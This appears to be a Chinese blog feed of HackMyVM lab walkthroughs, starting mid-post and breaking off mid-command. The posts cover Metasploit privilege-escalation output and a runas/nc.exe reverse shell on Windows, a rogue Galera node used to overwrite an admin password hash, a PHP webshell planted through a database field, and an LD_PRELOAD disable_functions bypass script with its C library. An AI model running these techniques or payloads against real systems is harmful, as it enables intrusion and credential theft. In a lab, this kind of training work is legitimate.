class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 26...</span><br><span class="line">msf6 exploit(multi/handler) &gt; </span><br><span class="line">msf6 exploit(multi/handler) &gt; use post/multi/recon/local_exploit_suggester</span><br><span class="line">msf6 post(multi/recon/local_exploit_suggester) &gt; sessions -l</span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Id  Name  Type                     Information                Connection</span><br><span class="line">  --  ----  ----                     -----------                ----------</span><br><span class="line">  2         shell                                               192.168.56.103:4444 -&gt; 192.168.56.109:49193 (192.168.56.109)</span><br><span class="line">  3         shell                                               192.168.56.103:4444 -&gt; 192.168.56.109:49194 (192.168.56.109)</span><br><span class="line">  5         shell                                               192.168.56.103:4444 -&gt; 192.168.56.109:49196 (192.168.56.109)</span><br><span class="line">  6         shell                                               192.168.56.103:4444 -&gt; 192.168.56.109:49197 (192.168.56.109)</span><br><span class="line">  9         shell                                               192.168.56.103:4444 -&gt; 192.168.56.109:49199 (192.168.56.109)</span><br><span class="line">  10        shell                                               192.168.56.103:4444 -&gt; 192.168.56.109:49200 (192.168.56.109)</span><br><span class="line">  11        shell                                               192.168.56.103:4444 -&gt; 192.168.56.109:49201 (192.168.56.109)</span><br><span class="line">  13        shell                                               192.168.56.103:4444 -&gt; 192.168.56.109:49202 (192.168.56.109)</span><br><span class="line">  14        shell                                               192.168.56.103:4444 -&gt; 192.168.56.109:49203 (192.168.56.109)</span><br><span class="line">  15        shell                                               192.168.56.103:4444 -&gt; 192.168.56.109:49204 (192.168.56.109)</span><br><span class="line">  16        shell                                               192.168.56.103:4444 -&gt; 192.168.56.109:49205 (192.168.56.109)</span><br><span class="line">  17        shell                                               192.168.56.103:4444 -&gt; 192.168.56.109:49206 (192.168.56.109)</span><br><span class="line">  18        shell                                               192.168.56.103:4444 -&gt; 192.168.56.109:49207 (192.168.56.109)</span><br><span class="line">  19        shell                                               192.168.56.103:4444 -&gt; 192.168.56.109:49208 (192.168.56.109)</span><br><span class="line">  20        shell                                               192.168.56.103:4444 -&gt; 192.168.56.109:49209 (192.168.56.109)</span><br><span class="line">  21        shell                                               192.168.56.103:4444 -&gt; 192.168.56.109:49210 (192.168.56.109)</span><br><span class="line">  22        shell                                               192.168.56.103:4444 -&gt; 192.168.56.109:49211 (192.168.56.109)</span><br><span class="line">  23        shell                                               192.168.56.103:4444 -&gt; 192.168.56.109:49212 (192.168.56.109)</span><br><span class="line">  24        shell                                               192.168.56.103:4444 -&gt; 192.168.56.109:49213 (192.168.56.109)</span><br><span class="line">  25        shell                                               192.168.56.103:4444 -&gt; 192.168.56.109:49214 (192.168.56.109)</span><br><span class="line">  26        meterpreter x86/windows  runas-PC\runas @ RUNAS-PC  192.168.56.103:4444 -&gt; 192.168.56.109:49215 (192.168.56.109)</span><br><span class="line"></span><br><span class="line">msf6 post(multi/recon/local_exploit_suggester) &gt; set session 26</span><br><span class="line">session =&gt; 26</span><br><span class="line">msf6 post(multi/recon/local_exploit_suggester) &gt; run</span><br><span class="line">[*] 192.168.56.109 - Collecting local exploits for x86/windows...</span><br><span class="line">/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/logging-2.4.0/lib/logging.rb:10: warning: /usr/lib/x86_64-linux-gnu/ruby/3.3.0/syslog.so was loaded from the standard library, but will no longer be part of the default gems starting from Ruby 3.4.0.</span><br><span class="line">You can add syslog to your Gemfile or gemspec to silence this warning.</span><br><span class="line">Also please contact the author of logging-2.4.0 to request adding syslog into its gemspec.</span><br><span class="line">[*] 192.168.56.109 - 203 exploit checks are being tried...</span><br><span class="line">[+] 192.168.56.109 - exploit/windows/local/bypassuac_comhijack: The target appears to be vulnerable.</span><br><span class="line">[+] 192.168.56.109 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.</span><br><span class="line">[+] 192.168.56.109 - exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move: The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 build detected!</span><br><span class="line">[+] 192.168.56.109 - exploit/windows/local/ms10_092_schelevator: The service is running, but could not be validated.</span><br><span class="line">[+] 192.168.56.109 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.</span><br><span class="line">[+] 192.168.56.109 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.</span><br><span class="line">[+] 192.168.56.109 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.</span><br><span class="line">[+] 192.168.56.109 - exploit/windows/local/tokenmagic: The target appears to be vulnerable.</span><br><span class="line">[*] Running check method for exploit 42 / 42</span><br><span class="line">[*] 192.168.56.109 - Valid modules for session 26:</span><br><span class="line">=============================</span><br><span class="line"></span><br><span class="line"> #   Name                                                           Potentially Vulnerable?  Check Result</span><br><span class="line"> -   ----                                                           -----------------------  ------------</span><br><span class="line"> 1   exploit/windows/local/bypassuac_comhijack                      Yes                      The target appears to be vulnerable.</span><br><span class="line"> 2   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.</span><br><span class="line"> 3   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   Yes                      The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 build detected!</span><br><span class="line"> 4   exploit/windows/local/ms10_092_schelevator                     Yes                      The service is running, but could not be validated.</span><br><span class="line"> 5   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.</span><br><span class="line"> 6   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.</span><br><span class="line"> 7   exploit/windows/local/ntusermndragover                         Yes                      The target appears to be vulnerable.</span><br><span class="line"> 8   exploit/windows/local/tokenmagic                               Yes                      The target appears to be vulnerable.</span><br><span class="line"> 9   exploit/windows/local/adobe_sandbox_adobecollabsync            No                       Cannot reliably check exploitability.</span><br><span class="line"> 10  exploit/windows/local/agnitum_outpost_acs                      No                       The target is not exploitable.</span><br><span class="line"> 11  exploit/windows/local/always_install_elevated                  No                       The target is not exploitable.</span><br><span class="line"> 12  exploit/windows/local/anyconnect_lpe                           No                       The target is not exploitable. vpndownloader.exe not found on file system</span><br><span class="line"> 13  exploit/windows/local/bits_ntlm_token_impersonation            No                       The target is not exploitable.</span><br><span class="line"> 14  exploit/windows/local/bthpan                                   No                       The target is not exploitable.</span><br><span class="line"> 15  exploit/windows/local/bypassuac_fodhelper                      No                       The target is not exploitable.</span><br><span class="line"> 16  exploit/windows/local/bypassuac_sluihijack                     No                       The target is not exploitable.</span><br><span class="line"> 17  exploit/windows/local/canon_driver_privesc                     No                       The target is not exploitable. No Canon TR150 driver directory found</span><br><span class="line"> 18  exploit/windows/local/cve_2020_1048_printerdemon               No                       The target is not exploitable.</span><br><span class="line"> 19  exploit/windows/local/cve_2020_1337_printerdemon               No                       The target is not exploitable.</span><br><span class="line"> 20  exploit/windows/local/gog_galaxyclientservice_privesc          No                       The target is not exploitable. Galaxy Client Service not found</span><br><span class="line"> 21  exploit/windows/local/ikeext_service                           No                       The check raised an exception.</span><br><span class="line"> 22  exploit/windows/local/ipass_launch_app                         No                       The check raised an exception.</span><br><span class="line"> 23  exploit/windows/local/lenovo_systemupdate                      No                       The check raised an exception.</span><br><span class="line"> 24  exploit/windows/local/lexmark_driver_privesc                   No                       The check raised an exception.</span><br><span class="line"> 25  exploit/windows/local/mqac_write                               No                       The target is not exploitable.</span><br><span class="line"> 26  exploit/windows/local/ms10_015_kitrap0d                        No                       The target is not exploitable.</span><br><span class="line"> 27  exploit/windows/local/ms13_053_schlamperei                     No                       The target is not exploitable.</span><br><span class="line"> 28  exploit/windows/local/ms13_081_track_popup_menu                No                       Cannot reliably check exploitability.</span><br><span class="line"> 29  exploit/windows/local/ms14_070_tcpip_ioctl                     No                       The target is not exploitable.</span><br><span class="line"> 30  exploit/windows/local/ms15_004_tswbproxy                       No                       The target is not exploitable.</span><br><span class="line"> 31  exploit/windows/local/ms16_016_webdav                          No                       The target is not exploitable.</span><br><span class="line"> 32  exploit/windows/local/ms16_032_secondary_logon_handle_privesc  No                       The check raised an exception.</span><br><span class="line"> 33  exploit/windows/local/ms16_075_reflection                      No                       The target is not exploitable.</span><br><span class="line"> 34  exploit/windows/local/ms16_075_reflection_juicy                No                       The target is not exploitable.</span><br><span class="line"> 35  exploit/windows/local/ms_ndproxy                               No                       The target is not exploitable.</span><br><span class="line"> 36  exploit/windows/local/novell_client_nicm                       No                       The target is not exploitable.</span><br><span class="line"> 37  exploit/windows/local/ntapphelpcachecontrol                    No                       The check raised an exception.</span><br><span class="line"> 38  exploit/windows/local/panda_psevents                           No                       The target is not exploitable.</span><br><span class="line"> 39  exploit/windows/local/ppr_flatten_rec                          No                       The target is not exploitable.</span><br><span class="line"> 40  exploit/windows/local/ricoh_driver_privesc                     No                       The target is not exploitable. No Ricoh driver directory found</span><br><span class="line"> 41  exploit/windows/local/virtual_box_guest_additions              No                       The target is not exploitable.</span><br><span class="line"> 42  exploit/windows/local/webexec                                  No                       The check raised an exception.</span><br><span class="line"></span><br><span class="line">[*] Post module execution completed</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>开始尝试可用的漏洞</p><p>所有的都试了没一个行的</p><p>做信息收集</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\runas&gt;whoami /priv</span><br><span class="line">whoami /priv</span><br><span class="line"></span><br><span class="line">AYRICALIK B�LG�LER�</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Ayr�cal�k Ad�                 A��klama                           Durum     </span><br><span class="line">============================= ================================== ==========</span><br><span class="line">SeShutdownPrivilege           Sistemi kapat                      Devre D���</span><br><span class="line">SeChangeNotifyPrivilege       �apraz ge�i� denetimini atla       Etkin     </span><br><span class="line">SeUndockPrivilege             Bilgisayar� takma biriminden ��kar Devre D���</span><br><span class="line">SeIncreaseWorkingSetPrivilege ��lem �al��ma k�mesini art�r       Devre D���</span><br><span class="line">SeTimeZonePrivilege           Saat dilimini de�i�tir             Devre D���</span><br><span class="line"></span><br><span class="line">C:\Users\runas&gt;cmdkey /list</span><br><span class="line">cmdkey /list</span><br><span class="line"></span><br><span class="line">Depolanan ge�erli kimlik bilgileri:</span><br><span class="line"></span><br><span class="line">    Hedef: Domain:interactive=RUNAS-PC\Administrator</span><br><span class="line">    T�r: Etki Alan� Parolas� </span><br><span class="line">    Kullan�c�: RUNAS-PC\Administrator</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>cmdkey /list</code> 用于列出当前用户存储的凭据（如用户名和密码），这些凭据通常用于自动登录到远程计算机、网络共享或其他受身份验证保护的资源。</p><p>发现任何值得尝试的凭据，可以将它们与 <code>runas</code> 命令和 <code>/savecred</code> 选项一起使用，如下所示。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">runas /savecred /user:Administrator cmd.exe</span><br></pre></td></tr></table></figure><p>该命令用于以 <code>Administrator</code> 用户的身份运行 <code>cmd.exe</code>（命令提示符），并使用 <code>savecred</code> 选项存储密码，以后运行相同的命令时无需再次输入密码。</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250721182348085.png" alt="image-20250721182348085"></p><p>如果没有远程左面的话就传进去一个nc.exe然后弹回来一个新的shell即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">runas /env /noprofile /savecred /user:Administrator &quot;C:\Users\runas\nc.exe 192.168.10.103 1234 -e cmd.exe&quot;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>hackmyvm_Galera</title>
      <link href="/2025/07/23/hackmyvm-Galera/"/>
      <url>/2025/07/23/hackmyvm-Galera/</url>
      
        <content type="html"><![CDATA[<p><img src="/../imgs/$%7Bfiilename%7D/image-20250709102451786.png" alt="image-20250709102451786"></p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250709105409028.png" alt="image-20250709105409028"></p><p>发现了一个4567端口比较奇怪根据靶机名猜到是Galera集群</p><p>其特点如下:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">同步复制</span><br><span class="line">主动且多主的拓扑</span><br><span class="line">读写任意节点</span><br><span class="line">自动的成员资格控制，失效的成员会自动剔除</span><br><span class="line">节点自动加入</span><br><span class="line">row级别的并行复制</span><br><span class="line">各节点可供客户端直接连接</span><br></pre></td></tr></table></figure><p><img src="/../imgs/$%7Bfiilename%7D/image-20250709105423064.png" alt="image-20250709105423064"></p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250709105437079.png" alt="image-20250709105437079"></p><p>php配置文件泄露</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250709165019501.png" alt="image-20250709165019501"></p><p>过滤了很多命令</p><p>80端口web服务爆破失败</p><p>我们尝试加入Galera集群已同步得到器数据库信息及操作权限</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250709170040842.png" alt="image-20250709170040842"></p><p>目标操作系统是 Debian 12 “Bookworm”Debian12, 默认仓库中的 MariaDB 版本是 10.11.11</p><p>为了防止集群同步过程出现问题我们也是用相同版本的MariaDB去伪装节点加入集群</p><p>创建节点docker配置结构如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose.yml</span><br><span class="line">version: &quot;3.9&quot;  # Docker Compose 文件格式版本</span><br><span class="line"></span><br><span class="line">services:</span><br><span class="line">  galera-atacante:</span><br><span class="line">    image: mariadb:10.11.11  # 使用官方 MariaDB 镜像，带 Galera 支持</span><br><span class="line">    container_name: galera-atacante  # 容器名称固定为 galera-atacante</span><br><span class="line">    network_mode: host  # 使用宿主机网络（必要条件，避免 SST 时端口问题）</span><br><span class="line">    environment:</span><br><span class="line">      - MARIADB_ALLOW_EMPTY_ROOT_PASSWORD=yes  # 允许 root 用户密码为空（仅限开发环境使用）</span><br><span class="line">      - MARIADB_ROOT_PASSWORD=  # 明确设置空密码（与上面一起使用）</span><br><span class="line">      - WSREP_SST_METHOD=rsync  # 设置 SST（状态快照传输）方法为 rsync</span><br><span class="line">    volumes:</span><br><span class="line">      - ./conf.d:/etc/mysql/conf.d:ro  # 将主机当前目录下的 conf.d 挂载到容器配置目录中（只读）</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">conf.d/galera.cnf</span><br><span class="line">[mysqld]  # 推荐使用 [mysqld] 段名以确保所有版本兼容</span><br><span class="line"></span><br><span class="line"># 启用 Galera 插件</span><br><span class="line">wsrep_on=ON</span><br><span class="line"></span><br><span class="line"># Galera 插件库路径（MariaDB 官方镜像中默认路径）</span><br><span class="line">wsrep_provider=/usr/lib/galera/libgalera_smm.so</span><br><span class="line"></span><br><span class="line"># 集群种子节点地址：</span><br><span class="line"># - 第一个节点启动时可以写 gcomm://</span><br><span class="line"># - 后续节点写入要连接的现有节点 IP</span><br><span class="line">wsrep_cluster_address=gcomm://192.168.56.107</span><br><span class="line"></span><br><span class="line"># 当前节点绑定的 IP 地址（用于其他节点连接此节点）</span><br><span class="line">wsrep_node_address=192.168.56.103</span><br><span class="line"></span><br><span class="line"># 当前节点的名称（任意命名，用于日志和识别）</span><br><span class="line">wsrep_node_name=atacante</span><br><span class="line"></span><br><span class="line"># Galera 所要求的必要配置项</span><br><span class="line">binlog_format=ROW                 # 使用 ROW 格式二进制日志（必须）</span><br><span class="line">default_storage_engine=InnoDB    # Galera 仅支持 InnoDB 引擎</span><br><span class="line">innodb_autoinc_lock_mode=2       # 设置自增锁模式，避免多节点插入冲突</span><br><span class="line"></span><br><span class="line"># 设置 SST 方法（状态快照传输）</span><br><span class="line"># rsync 是最简单的方式，适合测试环境</span><br><span class="line">wsrep_sst_method=rsync</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/../imgs/$%7Bfiilename%7D/image-20250709204759146.png" alt="image-20250709204759146"></p><p>docker去拉取MariaDB 镜像</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250709203759561.png" alt="image-20250709203759561"></p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250709203909347.png" alt="image-20250709203909347"></p><p>已经成功加入集群</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MariaDB [(none)]&gt; SHOW DATABASES</span><br><span class="line">    -&gt; ;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| galeradb           |</span><br><span class="line">| information_schema |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| sys                |</span><br><span class="line">+--------------------+</span><br><span class="line">5 rows in set (0.002 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; SHOW TABLES IN galeradb;</span><br><span class="line">+--------------------+</span><br><span class="line">| Tables_in_galeradb |</span><br><span class="line">+--------------------+</span><br><span class="line">| users              |</span><br><span class="line">+--------------------+</span><br><span class="line">1 row in set (0.001 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [galeradb]&gt; use galeradb;</span><br><span class="line">Database changed</span><br><span class="line">MariaDB [galeradb]&gt; select * from users;</span><br><span class="line">+----+----------+------------------+--------------------------------------------------------------+---------------------+</span><br><span class="line">| id | username | email            | password                                                     | created_at          |</span><br><span class="line">+----+----------+------------------+--------------------------------------------------------------+---------------------+</span><br><span class="line">|  1 | admin    | admin@galera.hmv | $2y$10$BCAQ6VSNOL9TzfE5/dnVmuc9R5PotwClWAHwRdRAt7RM0d9miJRzq | 2025-05-04 23:55:51 |</span><br><span class="line">+----+----------+------------------+--------------------------------------------------------------+---------------------+</span><br><span class="line">1 row in set (0.003 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [galeradb]&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个md5一直爆不出来我们搞清楚加密方式之后直接重新改写密码即可</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250709215208420.png" alt="image-20250709215208420"></p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250709215536956.png" alt="image-20250709215536956"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update users set password = &quot;$2a$12$CkewrEGSS7dLbfapvfJVl.Jloq9WKR9bdRlYk6Thx2m/D7mXKE522&quot; where id = 1 ;</span><br></pre></td></tr></table></figure><p>修改完直接admin&#x2F;admin登陆即可</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250714110841219.png" alt="image-20250714110841219"></p><p>这里发布消息之后我们进行查看但是不会解析</p><p><strong><img src="/../imgs/$%7Bfiilename%7D/image-20250714111415909.png" alt="image-20250714111415909"></strong></p><p>这个页面还有一个可控的点就是email</p><p>我们直接去修改email</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250714112105399.png" alt="image-20250714112105399"></p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250714112126273.png" alt="image-20250714112126273"></p><p>可以上传文件可以设计LD_PRELOAD劫持来进行命令执行拿到shell</p><p>原理:<code>LD_PRELOAD</code> 的作用是注入一个你自己写的 <code>.so</code> 动态链接库，它<strong>在操作系统层面</strong>生效，直接与底层 glibc（C 标准库）交互，因此<strong>绕过了 PHP 在脚本层面对函数的禁用控制</strong>。</p><p> 先整一个文件上传</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UPDATE users SET email=&quot;&lt;?php file_put_contents($_POST[&#x27;a&#x27;],base64_decode($_POST[&#x27;b&#x27;]));?&gt;&quot; WHERE username=&#x27;admin&#x27;;</span><br></pre></td></tr></table></figure><p>然后上传典型的 利用 <code>LD_PRELOAD</code> 绕过 <code>disable_functions</code> 实现命令执行的后门脚本</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    // 输出一个示例 URL，说明该脚本的使用方法</span><br><span class="line">    echo &quot;&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p&gt;&quot;;</span><br><span class="line"></span><br><span class="line">    // 获取要执行的命令，如 cmd=pwd</span><br><span class="line">    $cmd = $_GET[&quot;cmd&quot;];</span><br><span class="line"></span><br><span class="line">    // 获取命令输出保存路径，如 outpath=/tmp/xx</span><br><span class="line">    $out_path = $_GET[&quot;outpath&quot;];</span><br><span class="line"></span><br><span class="line">    // 构造完整的命令行，将输出重定向到指定路径</span><br><span class="line">    $evil_cmdline = $cmd . &quot; &gt; &quot; . $out_path . &quot; 2&gt;&amp;1&quot;;</span><br><span class="line"></span><br><span class="line">    // 输出构造后的命令行（用于调试或提示）</span><br><span class="line">    echo &quot;&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: &quot; . $evil_cmdline . &quot;&lt;/p&gt;&quot;;</span><br><span class="line"></span><br><span class="line">    // 将构造的命令写入自定义环境变量 EVIL_CMDLINE</span><br><span class="line">    // 该变量将在 LD_PRELOAD 注入的 .so 文件中读取并执行</span><br><span class="line">    putenv(&quot;EVIL_CMDLINE=&quot; . $evil_cmdline);</span><br><span class="line"></span><br><span class="line">    // 获取 .so 文件路径，如 sopath=/var/www/bypass_disablefunc_x64.so</span><br><span class="line">    $so_path = $_GET[&quot;sopath&quot;];</span><br><span class="line"></span><br><span class="line">    // 设置 LD_PRELOAD 环境变量为恶意 .so 的路径</span><br><span class="line">    // 这样下次触发 libc 函数调用时，该 .so 会被自动加载</span><br><span class="line">    putenv(&quot;LD_PRELOAD=&quot; . $so_path);</span><br><span class="line"></span><br><span class="line">    // 触发 libc 层的函数调用，通常用 mail() 或 error_log()</span><br><span class="line">    // 此调用会导致系统调用 send() 等 libc 函数，从而触发 LD_PRELOAD 加载 .so</span><br><span class="line">    error_log(&#x27;123&#x27;, 1, &#x27;test@qq.com&#x27;, &#x27;&#x27;);</span><br><span class="line"></span><br><span class="line">    // 下面两行是可选：</span><br><span class="line">    // 读取命令执行输出结果并展示在网页上（被注释掉）</span><br><span class="line">    // echo &quot;&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;&quot; . nl2br(file_get_contents($out_path)) . &quot;&lt;/p&gt;&quot;;</span><br><span class="line"></span><br><span class="line">    // 删除输出文件，清理痕迹（被注释掉）</span><br><span class="line">    // unlink($out_path);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $cmd = $_GET[&quot;cmd&quot;];</span><br><span class="line">    $out_path = $_GET[&quot;outpath&quot;];</span><br><span class="line">    $evil_cmdline = $cmd . &quot; &gt; &quot; . $out_path . &quot; 2&gt;&amp;1&quot;;</span><br><span class="line">    putenv(&quot;EVIL_CMDLINE=&quot; . $evil_cmdline);</span><br><span class="line">    $so_path = $_GET[&quot;sopath&quot;];</span><br><span class="line">    putenv(&quot;LD_PRELOAD=&quot; . $so_path);</span><br><span class="line">    error_log(&#x27;123&#x27;,1,&#x27;test@qq.com&#x27;,&#x27;&#x27;);</span><br></pre></td></tr></table></figure><p>这一个能传上去</p><p>再写一个要利用用的<code>.so</code> 文件</p><p>e.so就是<a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD%E8%BF%99%E4%B8%AA%E9%A1%B9%E7%9B%AE%E9%87%8C%E9%9D%A2%E7%9A%84x64%E7%9A%84so%E6%96%87%E4%BB%B6">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD这个项目里面的x64的so文件</a></p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250714213617939.png" alt="image-20250714213617939"></p><p>base64编码后上传</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">void __attribute__((constructor)) init() &#123;</span><br><span class="line">    char *cmd = getenv(&quot;EVIL_CMDLINE&quot;);</span><br><span class="line">    if (cmd != NULL) &#123;</span><br><span class="line">        system(cmd); // 执行命令</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最终没有拿到shell不知道怎么解决so文件base上传再编码之后和源文件不一致怎么解决</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UPDATE users SET email=&#x27;&lt;?php include(&quot;/etc/passwd&quot;); ?&gt;&#x27; WHERE username=&#x27;admin&#x27;;</span><br></pre></td></tr></table></figure><p><img src="/../imgs/$%7Bfiilename%7D/image-20250714112846741.png" alt="image-20250714112846741"></p><p>发现纯在用户donjuandeaustria</p><p>直接爆破密码</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250719140829608.png" alt="image-20250719140829608"></p><p>成功爆破出密码为amorcito</p><p>有一张图片</p><p>传出来做一下检查</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250719143913830.png" alt="image-20250719143913830"></p><p>就单纯是一张图片</p><p>什么都没有</p><p>可能是提示下面是兔子洞</p><p>linpeas.sh扫描</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">╔══════════╣ Analyzing Autologin Files (limit 70)</span><br><span class="line">                                                                                                                                                                                                                   </span><br><span class="line">-rw-r--r-- 1 root root 81 May  7 21:45 /etc/systemd/system/getty@tty20.service.d/autologin.conf</span><br><span class="line">[Service]</span><br><span class="line">ExecStart=</span><br><span class="line">ExecStart=-/sbin/agetty --autologin root --noclear %I $TERM</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">donjuandeaustria@galera:~$ who                                                                                                                                                                                     </span><br><span class="line">root     tty20        2025-07-18 22:46                                                                                                                                                                             </span><br><span class="line">donjuandeaustria pts/0        2025-07-19 02:08 (192.168.56.103)                                                                                                                                                    </span><br><span class="line">donjuandeaustria@galera:~$ users                                                                                                     </span><br><span class="line">donjuandeaustria root                                                                                                                                                                                         </span><br><span class="line">donjuandeaustria@galera:~$    </span><br><span class="line">donjuandeaustria@galera:/dev$ w</span><br><span class="line"> 03:51:41 up  5:05,  2 users,  load average: 0.00, 0.00, 0.00</span><br><span class="line">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">root     tty20    -                22:46    5:05m  0.03s  0.01s -bash</span><br><span class="line">donjuand pts/0    192.168.56.103   02:08    1.00s  0.04s   ?    w</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这就很明显知道两个终端而且 tty20肯定是root用户</p><p>都属于tty组我们直接查看root所在终端的内容</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /dev/vcs20或者cat /dev/vcsa20就能看到root用户虚拟终端上的内容：</span><br></pre></td></tr></table></figure><p><img src="/../imgs/$%7Bfiilename%7D/image-20250719154906430.png" alt="image-20250719154906430"></p><p>能看到root的密码</p><p>直接root登陆即可</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>hackmyvm_todd</title>
      <link href="/2025/05/29/hackmyvm-todd/"/>
      <url>/2025/05/29/hackmyvm-todd/</url>
      
        <content type="html"><![CDATA[<p>先寻找靶机</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">arp-scan -I eth1 192.168.56.0/24</span><br></pre></td></tr></table></figure><p><img src="/../imgs/$%7Bfiilename%7D/image-20250422170443295.png" alt="image-20250422170443295"></p><p>再次扫描其开放的服务</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -A -p- 192.168.56.104</span><br></pre></td></tr></table></figure><p><img src="/../imgs/$%7Bfiilename%7D/image-20250422170510808.png" alt="image-20250422170510808"></p><p>22,80和一个特殊的7066端口</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250422170739765.png" alt="image-20250422170739765"></p><p>目录扫描得到一个目录访问目录可知</p><p>其含有一些用得上的脚本</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250422171625377.png" alt="image-20250422171625377"></p><p>尝试连接7066发现直接给了个shell在自己目录下得到userflag</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250422171553030.png" alt="image-20250422171553030"></p><p>然后就很明显了进行提权</p><p>但是我们当前这个shell连上很快就会断掉没法操作</p><p>所以我们尝试ssh登录</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">生成密钥</span><br><span class="line">ssh-keygen -t rsa -f todd</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/../imgs/$%7Bfiilename%7D/image-20250422173452332.png" alt="image-20250422173452332"></p><p>公钥放到用户目录的.ssh目录下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd .ssh</span><br><span class="line">echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCpHHhd7bOxuRjUITqZZ3nLgdRGtBGtDhJ4c2q9FygCvXs/C/Tp5QbSF3VBRwoUX1jILpsdv8scHG1+OuwLB+ubyS//7KIV3tBcRTM0iiFGGfQMwLZtC71CWY8bgponYe1klA/bULqCCMDH56d1oEvvcM+lPb8mBpaAueVWYnSL8Bj5YZlECiafe1GshKI8M+URx7pc3SAspeBC5fWkp21rFIHi9zo3XkGslf/9mwbIO7SufNS4wnWJNlUjnUTUw1FtED+yy5PcXH2acwoNX6qyUkkBaoop4LU+408QH9AIN/7HDeHsOf/aHCqatYFF9EtSyQv6Gvh02RM7VwXyGpiDpUKT8bV6WczAa1bdDgJRWPTbPykg12RCS0NzCKLslDTqFQUlbuLHvlR3ZIKyhaoRdWIyBm+BNmLjPpKHCosrAUIRTwf5UzbUW8jqV1E8A57f4tbthR+PtFAm6uwAbxU+jjh0sP+HKJrF6c86r9ahBqc6TcT6k/5gQt3GmpzpxW8= root@kali&quot; 